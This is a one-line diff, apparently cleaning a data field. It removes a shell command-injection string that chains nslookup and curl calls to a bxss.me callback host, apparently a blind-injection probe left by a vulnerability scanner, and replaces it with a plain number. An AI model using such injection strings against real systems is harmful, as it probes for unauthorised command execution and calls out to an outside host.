@@ -1,1 +1,1 @@
-;(nslookup -q=cname hitpywhgrxwmj442bb.bxss.me||curl hitpywhgrxwmj442bb.bxss.me)|(nslookup -q=cname hitpywhgrxwmj442bb.bxss.me||curl hitpywhgrxwmj442bb.bxss.me)&(nslookup -q=cname hitpywhgrxwmj442bb.bxss.me||curl hitpywhgrxwmj442bb.bxss.me)
+5559743899
